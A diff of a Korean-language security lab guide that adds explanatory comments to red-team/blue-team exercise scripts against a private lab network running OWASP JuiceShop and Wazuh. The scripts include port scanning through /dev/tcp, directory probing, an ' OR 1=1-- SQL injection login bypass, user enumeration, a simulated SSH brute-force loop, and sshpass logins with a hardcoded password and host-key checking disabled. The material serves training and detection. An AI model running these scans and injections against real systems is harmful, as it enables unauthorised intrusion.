@@ -166,9 +166,9 @@ echo "기준선 시간: $(date '+%Y-%m-%d %H:%M:%S')"
 ```bash
 echo "=== Red Team: 정찰 ==="
 
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
 echo "--- 포트 스캔 ---"
-for port in 22 80 443 3000 8000 8080 3306 5432; do
+for port in 22 80 443 3000 8000 8080 3306 5432; do     # 반복문 시작
   (echo > /dev/tcp/10.20.30.1/$port) 2>/dev/null && echo "secu:$port OPEN" &
   (echo > /dev/tcp/10.20.30.100/$port) 2>/dev/null && echo "siem:$port OPEN" &
 done
@@ -180,7 +180,7 @@ curl -sI http://localhost:3000/ | grep -iE "^(server|x-powered)"
 
 echo ""
 echo "--- 디렉토리 탐색 ---"
-for path in admin api api-docs robots.txt .git package.json ftp; do
+for path in admin api api-docs robots.txt .git package.json ftp; do  # 반복문 시작
   CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$path)
   [ "$CODE" != "404" ] && echo "/$path -> HTTP $CODE"
 done
@@ -192,11 +192,11 @@ ENDSSH
 ```bash
 echo "=== Red Team: 초기 침투 ==="
 
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
 echo "--- SQL Injection ---"
 RESULT=$(curl -s -X POST http://localhost:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"'"'"' OR 1=1--","password":"x"}')
+  -d '{"email":"'"'"' OR 1=1--","password":"x"}')      # 요청 데이터(body)
 echo "$RESULT" | python3 -c "
 import json,sys
 try:
@@ -210,13 +210,13 @@ except: print('파싱 오류')
 
 echo ""
 echo "--- 사용자 정보 수집 ---"
-curl -s http://localhost:3000/api/Users 2>/dev/null | python3 -c "
+curl -s http://localhost:3000/api/Users 2>/dev/null | python3 -c "  # silent 모드
 import json,sys
 try:
     d = json.load(sys.stdin)
     users = d.get('data',[])
     print(f'사용자 목록: {len(users)}명')
-    for u in users[:3]:
+    for u in users[:3]:                                # 반복문 시작
         print(f'  {u.get(\"email\",\"\")} (role: {u.get(\"role\",\"\")})')
 except: print('접근 실패')
 " 2>/dev/null
@@ -228,8 +228,8 @@ ENDSSH
 ```bash
 echo "=== Red Team: SSH 무차별 대입 시뮬레이션 ==="
 
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
-for i in 1 2 3; do
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
+for i in 1 2 3; do                                     # 반복문 시작
   sshpass -p"wrong${i}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
     badsecu@10.20.30.1 echo "success" 2>/dev/null || echo "시도 $i: 실패"
 done
@@ -252,10 +252,10 @@ sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
 
 echo ""
 echo "--- Wazuh ---"
-sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 << 'ENDSSH'
-tail -10 /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c "
+sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 << 'ENDSSH'  # 비밀번호 자동입력 SSH
+tail -10 /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c "  # 파일 끝부분 출력
 import sys, json
-for line in sys.stdin:
+for line in sys.stdin:                                 # 반복문 시작
     try:
         a = json.loads(line.strip())
         rule = a.get('rule',{})
@@ -269,9 +269,11 @@ ENDSSH
 
 ### 4.2 ATT&CK 매핑
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
-python3 << 'PYEOF'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
+python3 << 'PYEOF'                                     # Python 스크립트 실행
 attacks = [
     ("Reconnaissance", "T1046", "Network Service Discovery", "포트 스캔"),
     ("Initial Access", "T1190", "Exploit Public-Facing App", "SQL Injection"),
@@ -282,7 +284,7 @@ attacks = [
 
 print(f"{'단계':<20} {'기법':<45} {'증거'}")
 print("=" * 80)
-for phase, tid, tech, evidence in attacks:
+for phase, tid, tech, evidence in attacks:             # 반복문 시작
     print(f"{phase:<20} {tid} {tech:<35} {evidence}")
 PYEOF
 ENDSSH
@@ -293,7 +295,7 @@ ENDSSH
 ```bash
 curl -s http://192.168.0.105:11434/v1/chat/completions \
   -H "Content-Type: application/json" \
-  -d '{
+  -d '{                                                # 요청 데이터(body)
     "model": "gemma3:12b",
     "messages": [
       {"role": "system", "content": "SOC L2 분석관입니다. 인시던트를 종합 분석합니다. 한국어로 간결하게."},
@@ -324,12 +326,14 @@ echo "  JuiceShop 관리자 세션 토큰 갱신 필요"
 
 ### 5.2 취약점 재점검
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
 echo "--- SQL Injection 재시도 ---"
 RESULT=$(curl -s -X POST http://localhost:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"'"'"' OR 1=1--","password":"x"}')
+  -d '{"email":"'"'"' OR 1=1--","password":"x"}')      # 요청 데이터(body)
 if echo "$RESULT" | grep -q "authentication"; then
   echo "[STILL VULNERABLE] SQLi 동작 - 코드 수정 필요"
 else
@@ -348,9 +352,11 @@ ENDSSH
 
 ### 6.1 인시던트 대응 보고서
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
-python3 << 'PYEOF'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
+python3 << 'PYEOF'                                     # Python 스크립트 실행
 from datetime import datetime
 
 report = f"""
